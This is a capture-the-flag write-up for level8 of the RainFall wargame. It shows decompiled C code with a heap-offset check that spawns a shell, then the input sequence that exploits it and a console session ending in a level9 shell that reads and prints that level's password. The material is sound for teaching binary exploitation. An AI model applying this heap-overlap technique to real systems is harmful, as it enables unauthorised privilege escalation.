## level8

https://dogbolt.org provides 11 different disassembly tools, and the output of Hex-Rays was by far the best for this level. With a bit of cleaning we get this:

```c
char* auth;
char* service;

int main() {
    char buf[128];

    while (true) {
        printf("%p, %p \n", auth, service);
        if (!fgets(buf, 128, stdin)) break;
        if (!strncmp(buf, "auth ", 5)) {
            auth = malloc(4);
            auth[0] = 0;
            if (strlen(buf + 5) <= 30) strcpy(auth, buf + 5);
        }
        if (!strncmp(buf, "reset", 5)) free(auth);
        if (!strncmp(buf, "service", 6)) service = strdup(buf + 7);
        if (!strncmp(buf, "login", 5)) {
            if (auth[32]) {
                system("/bin/sh");
            } else {
                fwrite("Password:\n", 1, 10, stdout);
            }
        }
    }
    return 0;
}
```

Working backwards, we see that we need `auth[32]` to contain a value, but `auth` is supposed to be only 4 characters long. It will read byte 20 of the next allocation, which we can create with `service` and a sufficiently long padding.

```console
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth axel
0x804a008, (nil) 
service!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
0x804a008, 0x804a018 
login
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
